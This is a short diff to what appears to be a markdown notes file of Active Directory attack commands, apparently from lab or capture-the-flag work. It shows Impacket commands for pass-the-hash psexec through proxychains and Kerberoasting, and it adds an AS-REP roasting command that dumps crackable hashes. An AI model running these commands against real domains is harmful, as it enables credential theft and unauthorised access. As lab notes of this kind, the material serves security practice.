@@ -57,3 +57,6 @@ proxychains -q impacket-psexec -hashes
  impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
 ```
 
+```
+impacket-GetNPUsers sync.csl/manager -format john
+```
